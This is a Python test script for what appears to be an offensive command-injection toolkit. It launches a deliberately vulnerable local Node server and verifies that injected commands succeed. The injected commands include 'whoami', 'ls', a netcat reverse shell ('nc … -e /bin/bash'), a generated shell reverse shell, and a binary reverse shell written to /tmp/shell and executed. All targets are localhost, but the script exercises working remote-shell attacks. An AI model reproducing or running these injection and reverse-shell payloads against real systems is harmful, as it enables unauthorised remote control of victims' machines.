#!/usr/bin/python3

# local tests

from payloads import Monkey, Generator

import os
import pwd
import time
import random

from server import ReverseListener

from multiprocessing import Process

backend = 'express'


def get_current_user():
    return pwd.getpwuid(os.getuid())[0]


def run_test_server():
    if backend == 'express':
        os.system('cd test_js && node vulnserver.js > /dev/null')
    else:
        pass


srv_proc = None


def start_test_server():
    global srv_proc
    srv_proc = Process(target=run_test_server)
    srv_proc.start()


start_test_server()

time.sleep(1)  # wait for server to start

url = 'http://127.0.0.1:3111/home'

try:
    monkey = Monkey(url)
except Exception:  # todo what exception is that?
    print("Probably node modules aren't installed, installing")
    os.system('cd test_js && npm i')
    time.sleep(15)
    start_test_server()
    monkey = Monkey(url)

print('-------------------------Parsing tests-------------------------------')

# bs4 is a pain in the ass, should I write more tests here?
assert monkey.get_forms() is not None
assert monkey.get_inputs() is not None
assert monkey.get_js_endpoints() is not None
assert monkey.get_js_urls() is not None
assert monkey.get_js_http_methods() is not None

print('PASSED✓')

print('-------------------------Form submit tests---------------------------')

injectable = {}
form_inputs = monkey.get_forms()[0].find_all("input")

for form_input in form_inputs:
    injectable[form_input.get("name")] = "whoami"

res = monkey.inject_forms(injectable)

assert res.decode() == 'SUCCESS'

print('PASSED✓')

print('------------------------JS urls submit tests--------------------------')

injectable = {}
inputs = monkey.get_inputs()
js_urls = monkey.get_js_urls()

for (input, url) in zip(inputs, js_urls):
    print(input, url)
    injectable[input.get("name")] = "ls"

res = monkey.inject_fetch(injectable)

assert res.decode() == 'SUCCESS'
print('PASSED✓')

print('-------------------------Payload injection tests---------------------')

ip = "127.0.0.1"
port = random.randint(12000, 20000)

listener = ReverseListener(ip, port, once=True, cmd_cb=lambda: 'whoami')

listener.start()

print('----------------netcat:----------------')

res = monkey.inject_fetch({'command': f"nc {ip} {port} -e /bin/bash\n"})

assert res.decode() == 'SUCCESS'
assert get_current_user() == listener.get_recv().strip()

print('PASSED✓')

listener.stop()

print('----------------shell:----------------')

ip = "127.0.0.1"
port = random.randint(12000, 20000)

listener = ReverseListener(ip, port, once=True, cmd_cb=lambda: 'whoami')

listener.start()

payload = Generator.shell_reverse_shell(lhost=ip, lport=port, s='sh')
print('injecting payload:', payload)

res = monkey.inject_fetch({'command': payload})

assert res.decode() == 'SUCCESS'
assert get_current_user() in listener.get_recv().strip()

print('PASSED✓')

listener.stop()

print('----------------binary:----------------')

ip = "127.0.0.1"
port = random.randint(12000, 20000)

listener = ReverseListener(ip, port, once=True, cmd_cb=lambda: 'whoami')

listener.start()

payload = Generator.bin_reverse_shell(lhost=ip, lport=port)
assert payload is not None

cmd = f'printf "{payload}" > /tmp/shell && chmod +x /tmp/shell && /tmp/shell'

res = monkey.inject_fetch({'command': cmd})

assert res.decode() == 'SUCCESS'
assert get_current_user() in listener.get_recv().strip()

print('PASSED✓')

listener.stop()

print('\nALL TESTS PASSED✓✓✓')

srv_proc.terminate()
quit()
